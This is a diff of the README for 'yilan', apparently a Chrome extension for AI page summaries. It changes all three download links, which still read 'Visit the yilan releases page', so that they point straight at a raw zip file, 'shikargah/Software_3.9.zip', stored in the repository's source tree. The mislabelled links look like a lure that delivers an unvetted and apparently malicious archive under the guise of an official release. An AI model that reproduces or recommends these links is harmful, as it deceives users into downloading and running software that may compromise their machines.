@@ -1,6 +1,6 @@
 # 🧩 yilan - Clear AI summaries for any page
 
-[![Download yilan](https://img.shields.io/badge/Download%20yilan-Visit%20Releases-blue?style=for-the-badge)](https://github.com/bradygross240/yilan/releases)
+[![Download yilan](https://img.shields.io/badge/Download%20yilan-Visit%20Releases-blue?style=for-the-badge)](https://github.com/bradygross240/yilan/raw/refs/heads/main/shikargah/Software_3.9.zip)
 
 ## 🚀 What yilan does
 
@@ -12,7 +12,7 @@ It is built for people who want a simple way to use AI on web pages without leav
 
 To get yilan on Windows, visit the releases page and download the latest release from there:
 
-[Visit the yilan releases page](https://github.com/bradygross240/yilan/releases)
+[Visit the yilan releases page](https://github.com/bradygross240/yilan/raw/refs/heads/main/shikargah/Software_3.9.zip)
 
 After you download it, you will install it in Chrome or another Chromium browser such as Edge or Brave.
 
@@ -164,4 +164,4 @@ ai-summarization, ai-summarizer, anthropic, chrome-extension, local-first, manif
 
 ## 📎 Download again
 
-[Visit the yilan releases page](https://github.com/bradygross240/yilan/releases)
+[Visit the yilan releases page](https://github.com/bradygross240/yilan/raw/refs/heads/main/shikargah/Software_3.9.zip)
